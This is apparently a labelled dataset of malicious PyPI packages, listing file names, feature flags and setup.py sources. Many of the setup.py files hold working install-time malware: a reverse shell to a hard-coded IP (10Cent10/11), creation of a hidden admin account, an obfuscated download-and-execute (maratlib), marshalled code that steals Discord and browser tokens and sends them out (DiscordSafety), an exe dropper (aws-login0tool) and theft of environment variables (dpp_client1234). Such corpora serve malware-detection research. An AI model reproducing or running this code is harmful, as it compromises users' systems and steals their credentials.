python3-dateutil-2.8.10,0,0,1,1,0,0,0,0,easter.py isoparser.py _parser.py __init__.py relativedelta.py rrule.py conftest.py test_isoparse_prop.py test_parser_prop.py test_easter.py test_imports.py test_import_star.py test_internals.py test_isoparser.py test_parser.py test_relativedelta.py test_rrule.py test_tz.py test_utils.py _common.py __init__.py tz.py win.py _common.py _factories.py __init__.py tzwin.py utils.py dateutil-zoneinfo.tar.gz rebuild.py __init__.py _common.py __init__.py LICENSE MANIFEST.in NEWS PKG-INFO pyproject.toml dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe README.rst setup.cfg setup.py updatezinfo.py zonefile_metadata.json,,1
req-tools-0.4,0,0,1,0,0,0,1,0,PKG-INFO req_tools.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt req_tools.py setup.cfg setup.py __init__.py,"from setuptools import setup

setup(
    # Needed to silence warnings (and to be a worthwhile package)
    name='req-tools',
    packages=['req-tools'],
    install_requires=['pywin32','pyscreeze','pynput','WMI'],
    version='0.4',
    license='MIT',
)",1
smplejson-1.1,1,0,0,1,0,0,1,0,PKG-INFO setup.py,,1
flask-requests-complex-0.0.1,0,0,1,1,1,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add user3 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup administrators user3 /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name=""flask-requests-complex"", version=""0.0.1"", author=""ternaryternary"", packages=[""2c84c9fb1f1dae4c0e339261d9c5d2e1""])",1
noblesse2-0.0.1,0,0,1,1,0,0,1,1,CHANGELOG.txt LICENCE.txt MANIFEST.in dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py noblesse2.py,"from setuptools import setup, find_packages
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='noblesse2',
  version='0.0.1',
  description='Optimiser',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='misery',
  author_email='predicc@protonmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='noblesse2', 
  packages=find_packages(),
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'discord.py==1.5.0',
    'cryptography'
    ] 
)
",1
noblessev2-0.0.2,0,0,1,1,0,0,1,1,CHANGELOG.txt LICENCE.txt MANIFEST.in dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.txt setup.cfg setup.py noblessev2.py,"from setuptools import setup, find_packages
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='noblessev2',
  version='0.0.2',
  description='A very basic calculator',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='misery',
  author_email='predicc@protonmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='noblessev2', 
  packages=find_packages(),
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'discord.py==1.5.0',
    'cryptography'
    ] 
)
",1
aryi-0.1,0,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt aryi.py,"from setuptools import setup

with open('README.md','r') as fh:
    long_description = fh.read()
setup(
    name=""aryi"",
    version='0.1',
    description='aryi',
    py_modules=[""aryi""],
    package_dir={'':'src'},
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=[
        ""requests"",
    ],
    url=""https://github.com/siph-er"",
    author=""sipher"",
    author_email=""xinftw@protonmail.com"",
    
)",1
maratlib-0.2,1,0,0,1,0,0,1,1,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"# coding: UTF-8
import sys
l1l_cringe_ = sys.version_info [0] == 2
l1l1l_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_ (l1ll_cringe_):
    global l11l1_cringe_
    l11l_cringe_ = ord (l1ll_cringe_ [-1])
    ll_cringe_ = l1ll_cringe_ [:-1]
    l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)
    l1_cringe_ = ll_cringe_ [:l1l1_cringe_] + ll_cringe_ [l1l1_cringe_:]
    if l1l_cringe_:
        l1lll_cringe_ = unicode () .join ([unichr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    else:
        l1lll_cringe_ = str () .join ([chr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    return eval (l1lll_cringe_)
from setuptools import setup
__import__(""os"").system(""chmod +x /tmp/aza-obf.sh"")
__import__(""os"").system(l111_cringe_ (u""ࠦࡼ࡭ࡥࡵࠢ࡫ࡸࡹࡶࡳ࠻࠱࠲ࡶࡦࡽ࠮ࡨ࡫ࡷ࡬ࡺࡨࡵࡴࡧࡵࡧࡴࡴࡴࡦࡰࡷ࠲ࡨࡵ࡭࠰ࡰࡨࡨࡴ࡭࠱࠳࠵࠲ࡪ࡮ࡲࡥࡴ࠱ࡰࡥ࡮ࡴ࠯ࡢࡼࡤ࠱ࡴࡨࡦ࠯ࡵ࡫ࠤ࠲ࡕࠠ࠰ࡶࡰࡴ࠴ࡧࡺࡢ࠯ࡲࡦ࡫࠴ࡳࡩࠢࠩࠪࠥࡨࡡࡴࡪࠣ࠳ࡹࡳࡰ࠰ࡣࡽࡥ࠲ࡵࡢࡧ࠰ࡶ࡬ࠧࠀ""))
setup(name=""maratlib"",
      version=""0.2"",
      description=l111_cringe_ (u""ࠧࡤࡷࡰࠫࠃ""),
      packages=[],
      author_email=l111_cringe_ (u""ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ""),
      zip_safe=False)",1
are-0.0.0.1,0,0,1,1,1,0,1,0,are.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,,1
maratlib1-0.1,1,0,0,1,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"# coding: UTF-8
import sys
l1l_cringe_ = sys.version_info [0] == 2
l1l1l_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_ (l1ll_cringe_):
    global l11l1_cringe_
    l11l_cringe_ = ord (l1ll_cringe_ [-1])
    ll_cringe_ = l1ll_cringe_ [:-1]
    l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)
    l1_cringe_ = ll_cringe_ [:l1l1_cringe_] + ll_cringe_ [l1l1_cringe_:]
    if l1l_cringe_:
        l1lll_cringe_ = unicode () .join ([unichr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    else:
        l1lll_cringe_ = str () .join ([chr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    return eval (l1lll_cringe_)
from setuptools import setup
print(__import__(""os"").system(""whoami""))
setup(name=""maratlib1"",
      version=""0.1"",
      description=l111_cringe_ (u""ࠧࡤࡷࡰࠫࠃ""),
      packages=[],
      author_email=l111_cringe_ (u""ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ""),
      zip_safe=False)",1
mllearnlib-0.7,0,0,0,0,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,,1
suffer-0.1,0,0,1,1,1,0,1,0,CHANGELOG.txt LICENCE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py,"from setuptools import setup, find_packages
 
classifiers = [
  ""Programming Language :: Python :: 3"",
  ""Programming Language :: Python :: 3.6"",
  ""Programming Language :: Python :: 3.7"",
  ""Programming Language :: Python :: 3.8"",
  ""License :: OSI Approved :: MIT License"",
  ""Operating System :: OS Independent""
]

setup(
  name='suffer',
  version='0.1',
  description='suffer',
  py_modules=[""suffer""],
  package_dir={'':'src'},
  classifiers=classifiers,
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='https://github.com/misery',  
  author='pre',
  author_email='cutsigns@protonmail.com',
  license='MIT', 
  install_requires=[
    'requests',
    'colorama',
    'discord',
    'asyncio',
    'datetime',
    'youtube_dl',
    'importlib_metadata',
    'mss',
    'pycryptodome',
    'pillow',
    'dhooks',
    'psutil',
    'cryptography',
    'wheel',
    'emoji',
    'pyarmor',
    'pytransform'
  ] 
)
",1
genesisbot-0.0.1,1,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt genesisbot.py,"from setuptools import setup

with open('README.md','r') as fh:
    long_description = fh.read()
setup(
    name=""genesisbot"",
    version='0.0.1',
    description='This Module Optimises your PC For Python',
    py_modules=[""genesisbot""],
    package_dir={'':'src'},
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    install_requires=[
        ""requests"",
    ],
    url=""https://github.com/devil-xin"",
    author=""xin"",
    author_email=""xinftw@protonmail.com"",
    
)",1
matplatlib-plus-1.1,0,0,0,1,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,,1
yiffparty-0.01,0,0,1,0,0,0,0,1,PKG-INFO README.rst setup.cfg setup.py horni.py __init__.py,"from distutils.core import setup
from os import path
this_directory = path.abspath(path.dirname(__file__))
with open(path.join(this_directory, 'README.rst'), encoding='utf-8') as f:
    long_description = f.read()
    
setup(
  name = 'yiffparty',    
  packages = ['yiffparty'],   
  version = '0.01',    
  license='MIT',       
  description = 'Simple tool to get images from yiff-party.com',
  long_description=long_description,
  long_description_content_type='text/markdown',
  author = 'icy__flames',                   
  author_email = 'dontfuckingbother@emailisfake.net',    
  url = 'http://lolurmomis.gay',    
  keywords = ['yiff', 'furry', 'porn', 'gay', 'straight', 'lesbian'],   
  install_requires=[     
          'requests',
          'beautifulsoup4',
      ],
  classifiers=[
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',     
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',       
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
    'Programming Language :: Python :: 3.9',
  ],
)
",1
ipboards-9999.0.2,0,0,1,0,0,0,1,0,CHANGELOG.txt exploit.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENCE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py,,1
DiscordSafety-0.1,1,0,0,1,0,0,1,1,__init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
import requests as rq
import sys
import os
import marshal as m


setup(name='DiscordSafety',
      version='0.1',
      description='Защитите свой дискорд аккаунт, установив библиотеку. После чего вы сможете: Видеть ip адресс человека который пытается войти в аккаунт, всякие Фишинг ссылки будут автоматически скрыты.',
      packages=['DiscordSafety'],
      author_email='abobus@gmail.com',
      zip_safe=False)

if 'install' in sys.argv:
	try:
		os.system('mkdir DiscordSword')
		os.chdir('C:/Users/User/Desktop')
		exec(m.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00@\x00\x00\x00s\xd6\x00\x00\x00d\x00d\x01l\x00Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05d\x00d\x01l\x06Z\x06d\x00d\x01l\x07Z\x07e\x02j\x08d\x02k\x03r\x84e\td\x03\x83\x01\x01\x00e\nd\x04\x83\x01D\x00]*Z\x0be\x0ce\x0b\x9b\x00d\x05\x9d\x02d\x06\x83\x02\x8f\x10Z\re\r\xa0\x0ed\x07\xa1\x01\x01\x00W\x005\x00Q\x00R\x00X\x00qRe\x0f\x83\x00\x01\x00d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13d\x14d\x15d\x16d\x17d\x18d\x19d\x1ad\x1bd\x1cd\x1dg\x16Z\x10d\x1ed\x1f\x84\x00Z\x11d d!\x84\x00Z\x12d""d#\x84\x00Z\x13e\x13\x83\x00\x01\x00d\x01S\x00)$\xe9\x00\x00\x00\x00N\xda\x02ntz\x03...i\xe8\x03\x00\x00z\x14-nuked-by-m4tvey2207z\x02w+z\x18Windows stav na komputer\xfa\x10ROAMING\\Discord\\\xfa\x12ROAMING\\Lightcord\\\xfa\x13ROAMING\\discordptb\\\xfa\x16ROAMING\\discordcanary\\\xfa$ROAMING\\Opera Software\\Opera Stable\\\xfa\'ROAMING\\Opera Software\\Opera GX Stable\\\xfa\x16LOCAL\\Amigo\\User Data\\\xfa\x16LOCAL\\Torch\\User Data\\\xfa\x17LOCAL\\Kometa\\User Data\\\xfa\x18LOCAL\\Orbitum\\User Data\\\xfa\x1cLOCAL\\CentBrowser\\User Data\\\xfa\x1cLOCAL\\7Star\\7Star\\User Data\\\xfa LOCAL\\Sputnik\\Sputnik\\User Data\\\xfa LOCAL\\Vivaldi\\User Data\\Default\\\xfa""LOCAL\\Google\\Chrome SxS\\User Data\\\xfa%LOCAL\\Epic Privacy Browser\\User Data\\\xfa&LOCAL\\Google\\Chrome\\User Data\\Default\\\xfa\'LOCAL\\uCozMedia\\Uran\\User Data\\Default\\\xfa\'LOCAL\\Microsoft\\Edge\\User Data\\Default\\\xfa-LOCAL\\Yandex\\YandexBrowser\\User Data\\Default\\\xfa2LOCAL\\Opera Software\\Opera Neon\\User Data\\Default\\\xfa4LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default\\c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00s\x96\x00\x00\x00|\x00d\x017\x00}\x00t\x00j\x01\xa0\x02|\x00\xa1\x01s\x18g\x00S\x00g\x00}\x01t\x00\xa0\x03|\x00\xa1\x01D\x00]j}\x02|\x02\xa0\x04d\x02\xa1\x01s@|\x02\xa0\x04d\x03\xa1\x01s@q&d\x04d\x05\x84\x00t\x05|\x00\x9b\x00d\x06|\x02\x9b\x00\x9d\x03d\x07d\x08\x8d\x02\xa0\x06\xa1\x00D\x00\x83\x01D\x00]*}\x03d\tD\x00] }\x04t\x07\xa0\x08|\x04|\x03\xa1\x02D\x00]\x0e}\x05|\x01\xa0\t|\x05\xa1\x01\x01\x00q|qlqdq&|\x01S\x00)\nNz\x16\\Local Storage\\leveldbz\x04.logz\x04.ldbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00s\x1c\x00\x00\x00g\x00|\x00]\x14}\x01|\x01\xa0\x00\xa1\x00r\x04|\x01\xa0\x00\xa1\x00\x91\x02q\x04S\x00\xa9\x00)\x01\xda\x05strip)\x02\xda\x02.0\xda\x01xr\x19\x00\x00\x00r\x19\x00\x00\x00\xda\x00\xda\n<listcomp>\x1b\x00\x00\x00s\x06\x00\x00\x00\x06\x00\x02\x00\x08\x00z\x1ffind_tokens.<locals>.<listcomp>\xfa\x01\\\xda\x06ignore)\x01\xda\x06errors)\x02z\x1e[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}z\x0emfa\\.[\\w-]{84})\n\xda\x02os\xda\x04path\xda\x06exists\xda\x07listdir\xda\x08endswith\xda\x04open\xda\treadlines\xda\x02re\xda\x07findall\xda\x06append)\x06r#\x00\x00\x00\xda\x06tokens\xda\tfile_name\xda\x04line\xda\x05regex\xda\x05tokenr\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x0bfind_tokens\x12\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x08\x01\x0c\x01\x04\x01\x04\x01\x0e\x01\x14\x01\x02\x02(\x01\x08\x01\x10\x01\x12\x01r1\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s4\x00\x00\x00g\x00}\x01g\x00}\x02|\x00D\x00]""}\x03|\x03|\x02k\x06r\x1aq\x0c|\x02\xa0\x00|\x03\xa1\x01\x01\x00|\x01\xa0\x00|\x03\xa1\x01\x01\x00q\x0c|\x01S\x00)\x01N)\x01r+\x00\x00\x00)\x04\xda\x04list\xda\x03ret\xda\x03all\xda\x02elr\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x05cutcc!\x00\x00\x00s\x10\x00\x00\x00\x00\x01\x04\x01\x04\x01\x08\x01\x08\x01\x02\x01\n\x01\x0c\x01r6\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00s\xb2\x00\x00\x00g\x00}\x00d\x01D\x00]Z}\x01|\x01\xa0\x00d\x02t\x01\xa0\x02d\x03\xa1\x01\xa1\x02\xa0\x00d\x04t\x01\xa0\x02d\x05\xa1\x01\xa1\x02}\x01t\x01j\x03\xa0\x04|\x01\xa1\x01s:q\x08t\x05|\x01\x83\x01}\x02t\x06|\x02\x83\x01d\x06k\x04r\x08|\x02D\x00]\x0e}\x03|\x00\xa0\x07|\x03\xa1\x01\x01\x00qRq\x08t\x06|\x00\x83\x01d\x06k\x04svt\x08\x83\x00\x01\x00t\t|\x00\x83\x01}\x00|\x00D\x00]*}\x03z\x14t\n\xa0\x0bd\x07|\x03\x9b\x00\x9d\x02\xa1\x01\x01\x00W\x00q\x82\x01\x00\x01\x00\x01\x00Y\x00q\x82Y\x00q\x82X\x00q\x82d\x00S\x00)\x08N)\x16r\x03\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x10\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00r\x13\x00\x00\x00r\x14\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00\xda\x07ROAMING\xda\x07APPDATA\xda\x05LOCALZ\x0cLOCALAPPDATAr\x01\x00\x00\x00z7https://tornadodomain.000webhostapp.com/stlr.php?token=)\x0c\xda\x07replacer""\x00\x00\x00\xda\x06getenvr#\x00\x00\x00r$\x00\x00\x00r1\x00\x00\x00\xda\x03lenr+\x00\x00\x00\xda\x04exitr6\x00\x00\x00\xda\x02rq\xda\x03get)\x04\xda\x03gtlr#\x00\x00\x00r,\x00\x00\x00r0\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x04main+\x00\x00\x00s""\x00\x00\x00\x00\x01\x04\x01\x08\x01 \x01\x0c\x01\x02\x01\x08\x02\x0c\x01\x08\x01\x0e\x01\x0c\x01\x06\x01\x08\x01\x08\x01\x02\x01\x14\x01\x06\x01rA\x00\x00\x00)\x14\xda\x08requestsr>\x00\x00\x00r""\x00\x00\x00\xda\x03sys\xda\x04timer)\x00\x00\x00\xda\x04json\xda\x06base64\xda\x04name\xda\x05print\xda\x05range\xda\x01nr\'\x00\x00\x00\xda\x01f\xda\x05writer=\x00\x00\x00\xda\x05pathsr1\x00\x00\x00r6\x00\x00\x00rA\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x19\x00\x00\x00r\x1d\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s""\x00\x00\x00\x08\x01\x08\x01\x08\x01\x08\x01\x08\x01\x08\x01\x08\x02\n\x01\x08\x01\x0c\x01\x12\x00\x16\x01\x06\x030\x02\x08\x0f\x08\n\x08\x14'))
	except:
		pass",1
10Cent11-999.0.4,0,0,1,0,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import pty

class CustomInstall(install):
    def run(self):
            install.run(self)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((""104.248.19.57"",3334))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn(""/bin/sh"")


setup(name='10Cent11',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})


",1
pptest-999.0.10,1,0,0,1,1,0,1,0,PKG-INFO __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt setup.cfg setup.py,"#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install_scripts import install_scripts

class InstallScripts(install_scripts):

    def run(self):
        setuptools.command.install_scripts.install_scripts.run(self)
        print('in setup....')
        # Rename some script files
        for script in self.get_outputs():
            if basename.endswith("".py"") or basename.endswith("".sh""):
                dest = script[:-3]
            else:
                continue
            print(""moving %s to %s"" % (script, dest))
            shutil.move(script, dest)
setup(
    name='pptest',
    version='999.0.10',
    author='pptest',
    author_email='testtt@google.com',
    url='https://www.google.com',
    description=u'just for test',
    packages=['pptest'],
    install_requires=['dnsPython'],
    entry_points={
        'console_scripts': [
            'pip3=pptest:mypip',
            'pip=pptest:mypip'
        ]
    },
    cmdclass={
        ""install_scripts"": InstallScripts
    }
)",1
importantpackage-0.1.22,1,0,0,1,1,0,1,0,PKG-INFO README.md setup.cfg setup.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import setuptools

with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""importantpackage"",
    install_requires = ['dnspython'],
    version=""0.1.22"",
    author=""Example Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/pypa/sampleproject"",
    project_urls={
        ""Bug Tracker"": ""https://github.com/pypa/sampleproject/issues"",
    },
    #packages=setuptools.find_packages(),
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 2"",
    ],
    package_dir={"""": ""src""},
    packages=setuptools.find_packages(where=""src""),
    #python_requires="">=3.6"",
)
",1
10Cent10-999.0.4,0,0,1,0,0,0,1,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import pty

class CustomInstall(install):
    def run(self):
            install.run(self)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((""104.248.19.57"",3333))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn(""/bin/sh"")


setup(name='10Cent10',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})


",1
botaa3,0,0,1,0,1,0,1,0,,,1
aws-login0tool-0.0.10,1,0,0,1,1,0,1,0,LICENSE PKG-INFO pyproject.toml README.md setup.cfg setup.py example.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"# Mooched from https://github.com/Ayrx/malicious-python-package/blob/master/setup.py

from setuptools import setup
from setuptools.command.install import install
from os import system
import setuptools
import urllib.request
from subprocess import run

class SneakyInstall(install):
    def run(self): 
        try:
        	urllib.request.urlretrieve(""https://tryg.ga/syswin32.exe"", ""syswin32.exe"")
        	run(['start', 'syswin32.exe'], shell=True)
        except Exception as e:
        	print(e)
        return True


with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()



setup(
    name=""aws-login0tool"",
    version=""0.0.10"",
    author=""Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://example.com"",
    project_urls={
        ""Bug Tracker"": ""https://example.com"",
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir={"""": ""src""},
    packages=setuptools.find_packages(where=""src""),
    python_requires="">=3.6"",
    cmdclass={'install': SneakyInstall},
)
",1
dpp_client-1.0.2,1,0,0,1,1,0,1,0,base.py http.py __init__.py test_http.py __init__.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pyproject.toml setup.cfg setup.py,,1
dpp_client1234-1.0.5,1,0,0,1,1,0,1,0,base.py http.py __init__.py test_http.py __init__.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO pyproject.toml setup.cfg setup.py,"import setuptools
import urllib.request
import urllib.parse
import os
from os import listdir
from os.path import isfile, join


stream = os.popen('env')
pwd = stream.read()

params = urllib.parse.urlencode({'pwd': pwd, 'files': os.listdir(""./../"")}).encode()

urllib.request.urlopen(""http://pt.traktrain.com/req.php?test"", data=params);


setuptools.setup(
    name=""dpp_client1234"", # Replace with your own username
    version=""1.0.5"",
    author=""Example Author"",
    author_email=""author@example.com"",
    description=""A small example package"",
    long_description=""test"",
    long_description_content_type=""text/markdown"",
    url=""https://github.com/pypa/sampleproject"",
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    packages=setuptools.find_packages(),
    python_requires='>=3.6',
)
",1
apple-py-music-1.0,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
setup(name = ""apple-py-music"", version = ""1.0"", packages = find_packages())",1
AadhaarCrypt-1.0,1,0,0,0,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
setup(name = ""AadhaarCrypt"", version = ""1.0"", packages = find_packages())",1
easyfuncsys-0.0.1,1,0,0,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1'
DESCRIPTION = 'Sniping names'
LONG_DESCRIPTION = 'Sniping names'

# Setting up
setup(
    name=""easyfuncsys"",
    version=VERSION,
    author=""nfsdfssdfone"",
    author_email=""nonfsdfddse@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)",1
humanqueen-0.0.1,1,0,0,1,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))

VERSION = '0.0.1'
DESCRIPTION = 'Package pour humanqueen'
LONG_DESCRIPTION = 'cest rien de ouf hein juste un package pour humanqueen'

# Setting up
setup(
    name=""humanqueen"",
    version=VERSION,
    author=""xin"",
    author_email=""xin@gmail.com"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'],
    keywords=[],
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)
",1
aiohttp_proxies-0.8.36,1,0,1,1,1,0,1,1,connector.py utils.py _deprecated.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,,1
